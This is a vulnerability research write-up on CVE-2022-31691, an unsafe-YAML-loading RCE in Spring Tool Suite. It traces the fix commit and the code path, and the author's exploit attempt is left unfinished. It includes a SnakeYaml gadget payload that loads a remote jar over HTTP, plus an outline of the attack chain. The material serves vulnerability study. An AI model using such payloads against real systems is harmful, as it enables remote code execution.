# CVE-2022-31691
A write-up of my (so far inconclusive) look into CVE-2022-31691.

# Background
I'm a frequent user of the Spring Tool Suite (STS) for Eclipse, and tend to rely on it to initialise new Spring Boot projects. This vulnerability (see https://tanzu.vmware.com/security/cve-2022-31691) is an RCE which can be induced through unsafe loading of content from a yaml configuration file. 

SnakeYaml is a very common yaml parser and emitter for Java. However, as with any marshalling/unmarshalling process, there's always the risk that unwanted content could be loaded straight into memory. SnakeYaml is no different - see https://code.google.com/archive/p/snakeyaml/wikis/Documentation.wiki#Tutorial. 

```
Loading YAML
Warning: It is not safe to call Yaml.load() with any data received from an untrusted source!
The method Yaml.load() converts a YAML document to a Java object.
```

With that in mind, the project maintainers added a SafeConstructor method:

```
Note if you want to limit objects to standard Java objects like List or Long you need to use SafeConstructor.
Yaml yaml = new Yaml(new SafeConstructor());
```

The rationale is pretty clear, but this advice clearly isn't being well-heeded. You don't need to look far to see examples of unsafe loading practices. Even Baeldung (a wonderful source of information on Spring) fails to mention this in its guide: https://www.baeldung.com/java-snake-yaml#basic-usage.

In order to exploit this, I need to get this constructor to unmarshall an object that I have control over. Foruntately, others have already done the leg work here. https://github.com/artsploit/yaml-payload is a really simple project to generate SnakeYaml exploit payloads a la https://github.com/mbechler/marshalsec. The rationale is:
- use the artsploit library to generate a gadget exploit jar
- host that exploit jar on a local webserver
- build a malicious yaml file that will trigger the load of that jar into memory
```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
  ]]
]
```
- work out which yaml files are being loaded by STS in an unsafe manner
- create an eclipse project that incudes this malicious yaml file, and make sure it follows the above attack chain up to achieve code execution.

# The STS changes
## Find the commit
This vulnerability was fixed in STS version 4.16.1. A quick look over the commits in this version offer up a couple of helpful pointers as to what was fixed - https://github.com/spring-projects/sts4/compare/4.16.0.RELEASE...4.16.1.RELEASE

The message on [this commit](https://github.com/spring-projects/sts4/commit/2d841f78fc4c7ebfcc191e93e8f27ce06835ea32) - "Use SafeConstructor in Snakeyaml YAML constructors" is a nice pointer to what's been fixed.

Sure enough, [this](https://github.com/spring-projects/sts4/commit/2d841f78fc4c7ebfcc191e93e8f27ce06835ea32#diff-2c281a6aa79de90814f45a2ee015ab10a3d4995a2e0c942a156f0db89050d6e3L389) is where the SafeConstructor is substituted.

```
YamlASTProvider parser = new YamlASTProvider(new Yaml(new SafeConstructor()));
```

If I'm interested in exploiting this, I need to get some malicious content into this SnakeYaml constructor, so I need to track down where it's called from.

## Find where the input comes from
The SnakeYaml object creation is fed an ```InputStream``` object that's created by a method ```getInputStream()```.

```getInputStream()``` calls ```getManifestFile()``` to determine which manifest file to load.

```getManifestFile()``` returns either the location of a manifest file (if specified in the constructor), or null.

The ```ApplicationManifestHandler``` class is initialised in the CloudFoundryBootDashModel class [here](https://github.com/spring-projects/sts4/blob/4.16.0.RELEASE/eclipse-extensions/org.springframework.ide.eclipse.boot.dash.cf/src/org/springframework/ide/eclipse/boot/dash/cf/model/CloudFoundryBootDashModel.java#L631) and is passed a value that's derived from a value set in the constructor for the resolveDeploymentProperties method [here](https://github.com/spring-projects/sts4/blob/4.16.0.RELEASE/eclipse-extensions/org.springframework.ide.eclipse.boot.dash.cf/src/org/springframework/ide/eclipse/boot/dash/cf/model/CloudFoundryBootDashModel.java#L541).


# Where I am so far - blocked!
I'm pretty sure I need to get some CloudFoundry configuration in place in order to get it to try to load/invoke my malicious manifest.yml file. 

It turns out that CloudFoundry is a dying technology, thanks to (I assume) Kubernetes and the like. I can't find any sort of public platforms to create a CF connection to, so I can't actually test things out from here.

# Next
Look into spinning up a local development instance of CloudFoundry, if only to test out my understanding of the vulnerability and exploit.
